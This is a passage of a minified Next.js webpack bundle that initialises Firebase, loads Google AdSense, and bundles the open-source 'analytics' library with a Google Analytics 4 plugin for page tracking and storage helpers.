0===(f=void 0)&&(f=B(y)?y:(m=t[i+1],(g=null==g?9007199254740991:g)&&("number"==typeof m||d.test(m))&&m>-1&&m%1==0&&m<g?[]:{}))}!function(e,t,n){var r=e[t];I.call(e,t)&&V(r,n)&&(void 0!==n||t in e)||(e[t]=n)}(c,h,f),c=c[h]}return e}(e,t,n)}},3454:function(e,t,n){"use strict";var r,i;e.exports=(null==(r=n.g.process)?void 0:r.env)&&"object"==typeof(null==(i=n.g.process)?void 0:i.env)?n.g.process:n(7663)},6840:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/_app",function(){return n(6126)}])},6126:function(e,t,n){"use strict";n.r(t),n.d(t,{auth:function(){return m},db:function(){return p},default:function(){return y}});var r=n(5893),i=n(5816);
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */(0,i.KN)("firebase","9.19.1","app");var s=n(4654),a=n(1294),o=n(4298),l=n.n(o),u=n(6501),c=n(1288);n(3814),n(5812),n(531);var h=n(5568);let d={apiKey:"AIzaSyC2RHVbPtC7vCoMSdaJj94JyWmzllSsS9k",authDomain:"noonshot-prod.firebaseapp.com",projectId:"noonshot-prod",storageBucket:"noonshot-prod.appspot.com",messagingSenderId:"554992705777",appId:"1:554992705777:web:fe3f08cc31d1986a198950",measurementId:"G-CVLM7ET3G8"},f=(0,i.ZF)(d),p=(0,a.ad)(f),m=(0,s.v0)(f),g=new c.PY(d);h.Z.page();var y=function(e){let{Component:t,pageProps:n}=e;return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(l(),{id:"Adsense-id",async:!0,onError:e=>{console.error("Script failed to load",e)},strategy:"afterInteractive",src:"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7241183734445898",crossOrigin:"anonymous",style:{maxWidth:"100vw"}}),(0,r.jsxs)(c.e0,{fuego:g,children:[(0,r.jsx)(t,{...n}),(0,r.jsx)(u.x7,{position:"top-center"})]})]})}},5568:function(e,t,n){"use strict";function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){var r,i;r=e,i=n[t],t in r?Object.defineProperty(r,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):r[t]=i})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}n.d(t,{Z:function(){return St}});var s={},a="https://www.googletagmanager.com/gtag/js",o={debug_mode:!1,send_page_view:!1,anonymize_ip:!1,allow_google_signals:!0,allow_ad_personalization_signals:!0,cookie_flags:""},l={gtagName:"gtag",dataLayerName:"ga4DataLayer",measurementIds:[],gtagConfig:o};function u(e){if(!e)throw Error("No GA Measurement ID defined");if(Array.isArray(e))return e;if("string"==typeof e)return[e];throw Error("GA Measurement ID must be string or array of strings")}function c(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t={},n=e.id,r=e.name,i=e.source,s=e.medium,a=e.content,o=e.keyword;return n&&(t.campaignId=n),r&&(t.campaignName=r),i&&(t.campaignSource=i),s&&(t.campaignMedium=s),a&&(t.campaignContent=a),o&&(t.campaignKeyword=o),t}function h(e){var t=document.querySelectorAll("script[src]"),n=RegExp("^".concat(e));return Boolean(Object.values(t).filter((function(e){return n.test(e.src)})).length)}function d(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}var f=n(6905),p=n.n(f),m=n(3454),g="undefined",y="object",v=void 0!==m?m:{},w=(v.env&&v.env.NODE_ENV,"undefined"!=typeof window);function b(e,t){return t.charAt(0)[e]()+t.slice(1)}w&&window.location.hostname,null!=v.versions&&v.versions.node,"undefined"!=typeof Deno&&Deno.core,"object"==typeof self&&self.constructor&&self.constructor.name,w&&"nodejs"===window.name||"undefined"!=typeof navigator&&(navigator.userAgent.includes("Node.js")||navigator.userAgent.includes("jsdom"));var _=b.bind(null,"toUpperCase"),I=b.bind(null,"toLowerCase");function E(e,t){void 0===t&&(t=!0);var n=null===e?_("null"):"object"==typeof e?S(e.constructor)?e.constructor.name:null:Object.prototype.toString.call(e).slice(8,-1);return t?I(n):n}function T(e,t){return typeof t===e}var S=T.bind(null,"function"),k=T.bind(null,"string"),A=T.bind(null,"undefined"),C=T.bind(null,"boolean");function N(e){if(!e||"object"!=typeof e&&null===e)return!1;for(var t=e;null!==Object.getPrototypeOf(t);)t=Object.getPrototypeOf(t);return Object.getPrototypeOf(e)===t}function O(e,t){if("object"!=typeof t||null===t)return!1;if(t instanceof e)return!0;var n,r,i=E(new e(""));if((n=t)instanceof Error||k(n.message)&&n.constructor&&"number"===E(r=n.constructor.stackTraceLimit)&&!isNaN(r))for(;t;){if(E(t)===i)return!0;t=Object.getPrototypeOf(t)}return!1}function D(e,t){var n,r=e instanceof Element||e instanceof HTMLDocument;return r&&t?(void 0===(n=t)&&(n=""),e&&e.nodeName===n.toUpperCase()):r}function R(e){var t=[].slice.call(arguments,1);return function(){return e.apply(void 0,[].slice.call(arguments).concat(t))}}function x(e){try{return decodeURIComponent(e.replace(/\+/g," "))}catch(e){return null}}function P(){for(var e="",t=0,n=4294967295*Math.random()|0;t++<36;){var r="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx"[t-1],i=15&n;e+="-"==r||"4"==r?r:("x"==r?i:3&i|8).toString(16),n=t%8==0?4294967295*Math.random()|0:n>>4}return e}T.bind(null,"symbol"),O.bind(null,TypeError),O.bind(null,SyntaxError),R(D,"form"),R(D,"button"),R(D,"input"),R(D,"select");var L="global",M="__global__",F=typeof self===y&&self.self===self&&self||typeof n.g===y&&n.g.global===n.g&&n.g||void 0;function U(e){return F[M][e]}function V(e,t){return F[M][e]=t}function j(e){delete F[M][e]}function B(e,t,n){var r;try{if($(e)){var i=window[e];r=i[t].bind(i)}}catch(e){}return r||n}F[M]||(F[M]={});var q={};function $(e){if(typeof q[e]!==g)return q[e];try{var t=window[e];t.setItem(g,g),t.removeItem(g)}catch(t){return q[e]=!1}return q[e]=!0}function z(){return(z=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}var G="function",K="undefined",H="@@redux/"+Math.random().toString(36),W=typeof Symbol===G&&Symbol.observable||"@@observable",Q=" != "+G;function J(){var e=[].slice.call(arguments);return 0===e.length?function(e){return e}:1===e.length?e[0]:e.reduce((function(e,t){return function(){return e(t.apply(void 0,[].slice.call(arguments)))}}))}function X(){var e=arguments;return function(t){return function(n,r,i){var s,a=t(n,r,i),o=a.dispatch,l={getState:a.getState,dispatch:function(e){return o(e)}};return s=[].slice.call(e).map((function(e){return e(l)})),z({},a,{dispatch:o=J.apply(void 0,s)(a.dispatch)})}}}var Y="__anon_id",Z="__user_id",ee="__user_traits",te="userId",ne="anonymousId",re=["bootstrap","params","campaign","initializeStart","initialize","initializeEnd","ready","resetStart","reset","resetEnd","pageStart","page","pageEnd","pageAborted","trackStart","track","trackEnd","trackAborted","identifyStart","identify","identifyEnd","identifyAborted","userIdChanged","registerPlugins","enablePlugin","disablePlugin","online","offline","setItemStart","setItem","setItemEnd","setItemAborted","removeItemStart","removeItem","removeItemEnd","removeItemAborted"],ie=["name","EVENTS","config","loaded"],se=re.reduce((function(e,t){return e[t]=t,e}),{registerPluginType:function(e){return"registerPlugin:"+e},pluginReadyType:function(e){return"ready:"+e}}),ae=/^utm_/,oe=/^an_prop_/,le=/^an_trait_/;function ue(e){return{userId:e.getItem(Z),anonymousId:e.getItem(Y),traits:e.getItem(ee)}}var ce=function(e){return"__TEMP__"+e},he={};function de(e,t){he[e]&&S(he[e])&&(he[e](t),delete he[e])}function fe(e,t,n){var r=t(),i=e.getState(),s=i.plugins,a=i.queue,o=i.user;if(!i.context.offline&&a&&a.actions&&a.actions.length){var l=a.actions.reduce((function(e,t,n){return s[t.plugin].loaded?(e.process.push(t),e.processIndex.push(n)):(e.requeue.push(t),e.requeueIndex.push(n)),e}),{processIndex:[],process:[],requeue:[],requeueIndex:[]});if(l.processIndex&&l.processIndex.length){l.processIndex.forEach((function(t){var i=a.actions[t],l=i.plugin,u=i.payload.type,c=r[l][u];if(c&&S(c)){var h,d,f=(void 0===(h=i.payload)&&(h={}),void 0===(d=o)&&(d={}),[te,ne].reduce((function(e,t){return h.hasOwnProperty(t)&&d[t]&&d[t]!==h[t]&&(e[t]=d[t]),e}),h));c({payload:f,config:s[l].config,instance:n});var p=u+":"+l;e.dispatch(z({},f,{type:p,_:{called:p,from:"queueDrain"}}))}}));var u=a.actions.filter((function(e,t){return!~l.processIndex.indexOf(t)}));a.actions=u}}}var pe=function(e){var t=e.data,n=e.action,r=e.instance,i=e.state,s=e.allPlugins,a=e.allMatches,o=e.store,l=e.EVENTS;try{var u,c=i.plugins,h=i.context,d=n.type,f=d.match(me),p=t.exact.map((function(e){return e.pluginName}));f&&(p=a.during.map((function(e){return e.pluginName})));var m=(u=p,function(e,t,n){var i,s,a=t.config,o=t.name,l=o+"."+e.type;n&&(l=n.event);var c=e.type.match(me)?(i=l,function(t,r){var s=n?n.name:o,a=r&&Te(r)?r:u;if(n&&(!(a=r&&Te(r)?r:[o]).includes(o)||1!==a.length))throw Error("Method "+i+" can only abort "+o+" plugin. "+JSON.stringify(a)+" input valid");return z({},e,{abort:{reason:t,plugins:a,caller:i,_:s}})}):(s=l,function(){throw Error(e.type+" action not cancellable. Remove abort in "+s)});return{payload:Object.keys(e).reduce((function(t,n){return"type"===n||(t[n]=N(e[n])?Object.assign({},e[n]):e[n]),t}),{}),instance:r,config:a||{},abort:c}}),g=t.exact.reduce((function(e,t){var n=t.pluginName,r=t.methodName,i=!1;return r.match(/^initialize/)||r.match(/^reset/)||(i=!c[n].loaded),h.offline&&r.match(/^(page|track|identify)/)&&(i=!0),e[""+n]=i,e}),{});return Promise.resolve(t.exact.reduce((function(e,i,a){var o=i.pluginName;return Promise.resolve(e).then((function(e){function i(){return Promise.resolve(e)}var a=function(){if(t.namespaced&&t.namespaced[o])return Promise.resolve(t.namespaced[o].reduce((function(e,t,n){return Promise.resolve(e).then((function(e){var n;return t.method&&S(t.method)?(function(e,t){var n=ke(e);if(n&&n.name===t){var r=ke(n.method);throw Error([t+" plugin is calling method "+e,"Plugins cant call self","Use "+n.method+" "+(r?"or "+r.method:"")+" in "+t+" plugin insteadof "+e].join("\n"))}}(t.methodName,t.pluginName),Promise.resolve(t.method({payload:e,instance:r,abort:(n=t.pluginName,function(t,r){return z({},e,{abort:{reason:t,plugins:r||[o],caller:d,from:n||o}})}),config:we(t.pluginName,c,s),plugins:c})).then((function(t){var n=N(t)?t:{};return Promise.resolve(z({},e,n))}))):e}))}),Promise.resolve(n))).then((function(t){e[o]=t}));e[o]=n}();return a&&a.then?a.then(i):i()}))}),Promise.resolve({}))).then((function(e){return Promise.resolve(t.exact.reduce((function(n,i,a){try{var l=t.exact.length===a+1,u=i.pluginName,h=s[u];return Promise.resolve(n).then((function(t){var n=e[u]?e[u]:{};if(f&&(n=t),Ie(n,u))return ve({data:n,method:d,instance:r,pluginName:u,store:o}),Promise.resolve(t);if(Ie(t,u))return l&&ve({data:t,method:d,instance:r,store:o}),Promise.resolve(t);if(g.hasOwnProperty(u)&&!0===g[u])return o.dispatch({type:"queue",plugin:u,payload:n,_:{called:"queue",from:"queueMechanism"}}),Promise.resolve(t);var i=m(e[u],s[u]);return Promise.resolve(h[d]({abort:i.abort,payload:n,instance:r,config:we(u,c,s),plugins:c})).then((function(i){var s=N(i)?i:{},a=z({},t,s),l=e[u];if(Ie(l,u))ve({data:l,method:d,instance:r,pluginName:u,store:o});else{var c=d+":"+u;!((c.match(/:/g)||[]).length<2)||d.match(ge)||d.match(ye)||r.dispatch(z({},f?a:n,{type:c,_:{called:c,from:"submethod"}}))}return Promise.resolve(a)}))}))}catch(e){return Promise.reject(e)}}),Promise.resolve(n))).then((function(e){if(!(d.match(me)||d.match(/^registerPlugin/)||d.match(ye)||d.match(ge)||d.match(/^params/)||d.match(/^userIdChanged/))){if(l.plugins.includes(d),e._&&e._.originalAction===d)return e;var n=z({},e,{_:{originalAction:e.type,called:e.type,from:"engineEnd"}});Ee(e,t.exact.length)&&!d.match(/End$/)&&(n=z({},n,{type:e.type+"Aborted"})),o.dispatch(n)}return e}))}))}catch(e){return Promise.reject(e)}},me=/Start$/,ge=/^bootstrap/,ye=/^ready/;function ve(e){var t=e.pluginName,n=e.method+"Aborted"+(t?":"+t:"");e.store.dispatch(z({},e.data,{type:n,_:{called:n,from:"abort"}}))}function we(e,t,n){var r=t[e]||n[e];return r&&r.config?r.config:{}}function be(e,t){return t.reduce((function(t,n){return n[e]?t.concat({methodName:e,pluginName:n.name,method:n[e]}):t}),[])}function _e(e,t){var n=e.replace(me,""),r=t?":"+t:"";return[""+e+r,""+n+r,n+"End"+r]}function Ie(e,t){var n=e.abort;return!!n&&(!0===n||Se(n,t)||n&&Se(n.plugins,t))}function Ee(e,t){var n=e.abort;if(!n)return!1;if(!0===n||k(n))return!0;var r=n.plugins;return Te(n)&&n.length===t||Te(r)&&r.length===t}function Te(e){return Array.isArray(e)}function Se(e,t){return!(!e||!Te(e))&&e.includes(t)}function ke(e){var t=e.match(/(.*):(.*)/);return!!t&&{method:t[1],name:t[2]}}var Ae=function(){var e=this;this.before=[],this.after=[],this.addMiddleware=function(t,n){e[n]=e[n].concat(t)},this.removeMiddleware=function(t,n){var r=e[n].findIndex((function(e){return e===t}));-1!==r&&(e[n]=[].concat(e[n].slice(0,r),e[n].slice(r+1)))},this.dynamicMiddlewares=function(t){return function(n){return function(r){return function(i){var s={getState:n.getState,dispatch:function(e){return n.dispatch(e)}},a=e[t].map((function(e){return e(s)}));return J.apply(void 0,a)(r)(i)}}}}};function Ce(e,t){return e.substring(t.length+1,e.length)}function Ne(e,t,n){return e.reduce((function(e,r){return e[r]=z({},n[r],{enabled:t}),e}),n)}function Oe(e){try{return JSON.parse(JSON.stringify(e))}catch(e){}return e}var De={last:{},history:[]};function Re(e,t){void 0===e&&(e=De);var n=t.options,r=t.meta;if(t.type===se.track){var i=Oe(z({event:t.event,properties:t.properties},Object.keys(n).length&&{options:n},{meta:r}));return z({},e,{last:i,history:e.history.concat(i)})}return e}var xe={actions:[]};function Pe(e,t){void 0===e&&(e=xe);var n,r=t.payload;switch(t.type){case"queue":return n=r&&r.type&&r.type===se.identify?[t].concat(e.actions):e.actions.concat(t),z({},e,{actions:n});case"dequeue":return[];default:return e}}var Le,Me,Fe,Ue,Ve=/#.*$/,je=function(e){if(void 0===e&&(e={}),!w)return e;var t,n,r=document,i=r.title,s=r.referrer,a=window,o=a.location,l=a.innerWidth,u=a.innerHeight,c=o.hash,h=o.search,d=(t=function(){if(w)for(var e,t=document.getElementsByTagName("link"),n=0;e=t[n];n++)if("canonical"===e.getAttribute("rel"))return e.getAttribute("href")}())?t.match(/\?/)?t:t+h:window.location.href.replace(Ve,""),f={title:i,url:d,path:"/"+((n=/(http[s]?:\/\/)?([^\/\s]+\/)(.*)/g.exec(d))&&n[3]?n[3].split("?")[0].replace(Ve,""):""),hash:c,search:h,width:l,height:u};return s&&""!==s&&(f.referrer=s),z({},f,e)},Be={last:{},history:[]};function qe(e,t){void 0===e&&(e=Be);var n=t.options;if(t.type===se.page){var r=Oe(z({properties:t.properties,meta:t.meta},Object.keys(n).length&&{options:n}));return z({},e,{last:r,history:e.history.concat(r)})}return e}Le=function(){if(!w)return!1;var e=navigator.appVersion;return~e.indexOf("Win")?"Windows":~e.indexOf("Mac")?"MacOS":~e.indexOf("X11")?"UNIX":~e.indexOf("Linux")?"Linux":"Unknown OS"}(),Me=w?document.referrer:null,Fe=function(){if(w){var e=navigator,t=e.languages;return e.userLanguage||(t&&t.length?t[0]:e.language)}}(),Ue=function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}}();var $e={initialized:!1,sessionId:P(),app:null,version:null,debug:!1,offline:!!w&&!navigator.onLine,os:{name:Le},userAgent:w?navigator.userAgent:"node",library:{name:"analytics",version:"0.11.0"},timezone:Ue,locale:Fe,campaign:{},referrer:Me};function ze(e,t){void 0===e&&(e=$e);var n=e.initialized,r=t.campaign;switch(t.type){case se.campaign:return z({},e,{campaign:r});case se.offline:return z({},e,{offline:!0});case se.online:return z({},e,{offline:!1});default:return n?e:z({},$e,e,{initialized:!0})}}var Ge=["plugins","reducers","storage"];function Ke(e,t,n){if(w){var r=window[(n?"add":"remove")+"EventListener"];e.split(" ").forEach((function(e){r(e,t)}))}}function He(){return V("analytics",[]),function(e){return function(t,n,r){var i=e(t,n,r),s=i.dispatch;return Object.assign(i,{dispatch:function(e){return F[M].analytics.push(e.action||e),s(e)}})}}}function We(e){return function(){return J(J.apply(null,arguments),He())}}function Qe(e){return e?"array"===E(e)?e:[e]:[]}function Je(e,t,n){void 0===e&&(e={});var r,i=P();return t&&(he[i]=(r=function(e){for(var t,n=e||Array.prototype.slice.call(arguments),r=0;r<n.length;r++)if(S(n[r])){t=n[r];break}return t}(n),function(e){r&&r(e),t(e)})),z({},e,{rid:i,ts:(new Date).getTime()},t?{hasCallback:!0}:{})}var Xe="before",Ye="after",Ze="cookie",et=rt(),tt=it;function nt(e){return et?it(e,"",-1):j(e)}function rt(){if(void 0!==et)return et;var e="cookiecookie";try{it(e,e),et=-1!==document.cookie.indexOf(e),nt(e)}catch(e){et=!1}return et}function it(e,t,n,r,i,s){if("undefined"!=typeof window){var a=arguments.length>1;return!1===et&&(a?V(e,t):U(e)),a?document.cookie=e+"="+encodeURIComponent(t)+(n?"; expires="+new Date(+new Date+1e3*n).toUTCString()+(r?"; path="+r:"")+(i?"; domain="+i:"")+(s?"; secure":""):""):decodeURIComponent((("; "+document.cookie).split("; "+e+"=")[1]||"").split(";")[0])}}var st="localStorage",at=$.bind(null,"localStorage");B("localStorage","getItem",U),B("localStorage","setItem",V),B("localStorage","removeItem",j);var ot="sessionStorage",lt=$.bind(null,"sessionStorage");function ut(e){var t=e;try{if("true"===(t=JSON.parse(e)))return!0;if("false"===t)return!1;if(N(t))return t;parseFloat(t)===t&&(t=parseFloat(t))}catch(e){}if(null!==t&&""!==t)return t}B("sessionStorage","getItem",U),B("sessionStorage","setItem",V),B("sessionStorage","removeItem",j);var ct=at(),ht=lt(),dt=rt();function ft(e,t){if(e){var n=pt(t),r=!vt(n),i=mt(n)?ut(localStorage.getItem(e)):void 0;if(r&&!A(i))return i;var s=gt(n)?ut(tt(e)):void 0;if(r&&s)return s;var a=yt(n)?ut(sessionStorage.getItem(e)):void 0;if(r&&a)return a;var o=U(e);return r?o:{localStorage:i,sessionStorage:a,cookie:s,global:o}}}function pt(e){return e?k(e)?e:e.storage:"any"}function mt(e){return ct&&wt(e,st)}function gt(e){return dt&&wt(e,Ze)}function yt(e){return ht&&wt(e,ot)}function vt(e){return"*"===e||"all"===e}function wt(e,t){return"any"===e||e===t||vt(e)}function bt(e,t,n){return{location:e,current:t,previous:n}}var _t={setItem:function(e,t,n){if(e&&!A(t)){var r={},i=pt(n),s=JSON.stringify(t),a=!vt(i);return mt(i)&&(r[st]=bt(st,t,ut(localStorage.getItem(e))),localStorage.setItem(e,s),a)?r[st]:gt(i)&&(r[Ze]=bt(Ze,t,ut(tt(e))),it(e,s),a)?r[Ze]:yt(i)&&(r[ot]=bt(ot,t,ut(sessionStorage.getItem(e))),sessionStorage.setItem(e,s),a)?r[ot]:(r[L]=bt(L,t,U(e)),V(e,t),a?r[L]:r)}},getItem:ft,removeItem:function(e,t){if(e){var n=pt(t),r=ft(e,"*"),i={};return!A(r.localStorage)&&mt(n)&&(localStorage.removeItem(e),i[st]=r.localStorage),!A(r.cookie)&&gt(n)&&(nt(e),i[Ze]=r.cookie),!A(r.sessionStorage)&&yt(n)&&(sessionStorage.removeItem(e),i[ot]=r.sessionStorage),!A(r.global)&&wt(n,L)&&(j(e),i[L]=r.global),i}}};function It(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function Et(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?It(Object(n),!0).forEach((function(t){var r,i;r=e,i=n[t],t in r?Object.defineProperty(r,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):r[t]=i})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):It(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function Tt(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return function(e){void 0===e&&(e={});var t,n=e.reducers||{},r=e.initialUser||{},i=(e.plugins||[]).reduce((function(e,t){if(S(t))return e.middlewares=e.middlewares.concat(t),e;if(t.NAMESPACE&&(t.name=t.NAMESPACE),!t.name)throw Error("https://lytics.dev/errors/1");var n=t.EVENTS?Object.keys(t.EVENTS).map((function(e){return t.EVENTS[e]})):[];e.pluginEnabled[t.name]=!(!1===t.enabled||t.config&&!1===t.config.enabled),delete t.enabled,t.methods&&(e.methods[t.name]=Object.keys(t.methods).reduce((function(e,n){var r;return e[n]=(r=t.methods[n],function(){for(var e=Array.prototype.slice.call(arguments),t=Array(r.length),n=0;n<e.length;n++)t[n]=e[n];return t[t.length]=I,r.apply({instance:I},t)}),e}),{}),delete t.methods);var r=Object.keys(t).concat(n),i=new Set(e.events.concat(r));if(e.events=Array.from(i),e.pluginsArray=e.pluginsArray.concat(t),e.plugins[t.name])throw Error(t.name+"AlreadyLoaded");return e.plugins[t.name]=t,e.plugins[t.name].loaded||(e.plugins[t.name].loaded=function(){return!0}),e}),{plugins:{},pluginEnabled:{},methods:{},pluginsArray:[],middlewares:[],events:[]}),s=e.storage?e.storage:{getItem:U,setItem:V,removeItem:j},a=function(e,t,n){return t.getState("user")[e]||(n&&N(n)&&n[e]?n[e]:ue(s)[e]||U(ce(e))||null)},o=i.plugins,l=i.events.filter((function(e){return!ie.includes(e)})).sort(),u=Array.from(new Set(l.concat(re).filter((function(e){return!ie.includes(e)})))).sort(),c=function(){return o},h=new Ae,d=h.addMiddleware,f=h.removeMiddleware,m=h.dynamicMiddlewares,g=function(){throw Error("Abort disabled inListener")},y=function(e){for(var t,n=Object.create(null),r=/([^&=]+)=?([^&]*)/g;t=r.exec(e);){var i=x(t[1]),s=x(t[2]);"[]"===i.substring(i.length-2)?(n[i=i.substring(0,i.length-2)]||(n[i]=[])).push(s):n[i]=""===s||s}for(var a in n){var o=a.split("[");o.length>1&&(function(e,t,n){for(var r=t.length-1,i=0;i<r;++i){var s=t[i];if("__proto__"===s||"constructor"===s)break;s in e||(e[s]={}),e=e[s]}e[t[r]]=n}(n,o.map((function(e){return e.replace(/[?[\]\\ ]/g,"")})),n[a]),delete n[a])}return n}(w&&window.location.search.substring(1)),v=ue(s),b=z({},v,r,y.an_uid?{userId:y.an_uid}:{},y.an_aid?{anonymousId:y.an_aid}:{});b.anonymousId||(b.anonymousId=P());var _=z({enable:function(e,t){return new Promise((function(n){ve.dispatch({type:se.enablePlugin,plugins:Qe(e),_:{originalAction:se.enablePlugin}},n,[t])}))},disable:function(e,t){return new Promise((function(n){ve.dispatch({type:se.disablePlugin,plugins:Qe(e),_:{originalAction:se.disablePlugin}},n,[t])}))}},i.methods),I={identify:function(e,t,n,r){try{var i=k(e)?e:null,s=N(e)?e:t,o=n||{},l=I.user();V(ce(te),i);var u=i||s.userId||a(te,I,s);return Promise.resolve(new Promise((function(e){ve.dispatch(z({type:se.identifyStart,userId:u,traits:s||{},options:o,anonymousId:l.anonymousId},l.id&&l.id!==i&&{previousId:l.id}),e,[t,n,r])})))}catch(e){return Promise.reject(e)}},track:function(e,t,n,r){try{var i=N(e)?e.event:e;if(!i||!k(i))throw Error("EventMissing");var s=N(e)?e:t||{},o=N(n)?n:{};return Promise.resolve(new Promise((function(e){ve.dispatch({type:se.trackStart,event:i,properties:s,options:o,userId:a(te,I,t),anonymousId:a(ne,I,t)},e,[t,n,r])})))}catch(e){return Promise.reject(e)}},page:function(e,t,n){try{var r=N(e)?e:{},i=N(t)?t:{};return Promise.resolve(new Promise((function(s){ve.dispatch({type:se.pageStart,properties:je(r),options:i,userId:a(te,I,r),anonymousId:a(ne,I,r)},s,[e,t,n])})))}catch(e){return Promise.reject(e)}},user:function(e){if(e===te||"id"===e)return a(te,I);if(e===ne||"anonId"===e)return a(ne,I);var t=I.getState("user");return e?p()(t,e):t},reset:function(e){return new Promise((function(t){ve.dispatch({type:se.resetStart},t,e)}))},ready:function(e){return I.on(se.ready,e)},on:function(e,t){if(!e||!S(t))return!1;if(e===se.bootstrap)throw Error(".on disabled for "+e);var n=/Start$|Start:/;if("*"===e){var r=function(e){return function(e){return function(r){return r.type.match(n)&&t({payload:r,instance:I,plugins:o}),e(r)}}},i=function(e){return function(e){return function(r){return r.type.match(n)||t({payload:r,instance:I,plugins:o}),e(r)}}};return d(r,Xe),d(i,Ye),function(){f(r,Xe),f(i,Ye)}}var s=e.match(n)?Xe:Ye,a=function(n){return function(n){return function(r){return r.type===e&&t({payload:r,instance:I,plugins:o,abort:g}),n(r)}}};return d(a,s),function(){return f(a,s)}},once:function(e,t){if(!e||!S(t))return!1;if(e===se.bootstrap)throw Error(".once disabled for "+e);var n=I.on(e,(function(e){t({payload:e.payload,instance:I,plugins:o,abort:g}),n()}));return n},getState:function(e){var t=ve.getState();return e?p()(t,e):Object.assign({},t)},dispatch:function(e){var t=k(e)?{type:e}:e;if(re.includes(t.type))throw Error("reserved action "+t.type);var n=z({},t,{_:z({originalAction:t.type},e._||{})});ve.dispatch(n)},enablePlugin:_.enable,disablePlugin:_.disable,plugins:_,storage:{getItem:s.getItem,setItem:function(e,t,n){ve.dispatch({type:se.setItemStart,key:e,value:t,options:n})},removeItem:function(e,t){ve.dispatch({type:se.removeItemStart,key:e,options:t})}},setAnonymousId:function(e,t){I.storage.setItem(Y,e,t)},events:{core:re,plugins:l}},E=i.middlewares.concat([function(e){return function(e){return function(t){return t.meta||(t.meta=Je()),e(t)}}},m(Xe),(D={all:u,plugins:l},R={},function(e){return function(t){return function(n){try{var r,i=function(e){return r?e:t(o)},s=n.type,a=n.plugins,o=n;if(n.abort)return Promise.resolve(t(n));if(s===se.enablePlugin&&e.dispatch({type:se.initializeStart,plugins:a,disabled:[],fromEnable:!0,meta:n.meta}),s===se.disablePlugin&&setTimeout((function(){return de(n.meta.rid,{payload:n})}),0),s===se.initializeEnd){var l=c(),u=Object.keys(l),h=u.filter((function(e){return a.includes(e)})).map((function(e){return l[e]})),d=[],f=[],p=n.disabled,m=h.map((function(t){var n=t.name;return function e(t,n,r){return new Promise((function(i,s){return n()?i(t):r<1?s(z({},t,{queue:!0})):new Promise((function(e){return setTimeout(e,10)})).then((function(a){return e(t,n,r-10).then(i,s)}))}))}(t,t.loaded,1e4).then((function(r){return R[n]||(e.dispatch({type:se.pluginReadyType(n),name:n,events:Object.keys(t).filter((function(e){return!ie.includes(e)}))}),R[n]=!0),d=d.concat(n),t})).catch((function(e){if(e instanceof Error)throw Error(e);return f=f.concat(e.name),e}))}));Promise.all(m).then((function(t){var n={plugins:d,failed:f,disabled:p};setTimeout((function(){u.length===m.length+p.length&&e.dispatch(z({},{type:se.ready},n))}),0)}))}var g=function(){if(s!==se.bootstrap)return/^ready:([^:]*)$/.test(s)&&setTimeout((function(){return fe(e,c,I)}),0),Promise.resolve(function(e,t,n,r,i){try{var s,a,o,l,u=S(t)?t():t,c=e.type,h=c.replace(me,"");if(e._&&e._.called)return Promise.resolve(e);var d=n.getState(),f=(void 0===(o=d.plugins)&&(o={}),void 0===(l=e.options)&&(l={}),Object.keys(u).filter((function(e){var t=l.plugins||{};return C(t[e])?t[e]:!1!==t.all&&(!o[e]||!1!==o[e].enabled)})).map((function(e){return u[e]})));c===se.initializeStart&&e.fromEnable&&(f=Object.keys(d.plugins).filter((function(t){var n=d.plugins[t];return e.plugins.includes(t)&&!n.initialized})).map((function(e){return u[e]})));var p=f.map((function(e){return e.name})),m=(s=f,a=_e(c).map((function(e){return be(e,s)})),s.reduce((function(e,t){var n=t.name,r=_e(c,n).map((function(e){return be(e,s)})),i=r[0],a=r[1],o=r[2];return i.length&&(e.beforeNS[n]=i),a.length&&(e.duringNS[n]=a),o.length&&(e.afterNS[n]=o),e}),{before:a[0],beforeNS:{},during:a[1],duringNS:{},after:a[2],afterNS:{}}));return Promise.resolve(pe({action:e,data:{exact:m.before,namespaced:m.beforeNS},state:d,allPlugins:u,allMatches:m,instance:n,store:r,EVENTS:i})).then((function(e){function t(){var t=function(){if(c.match(me))return 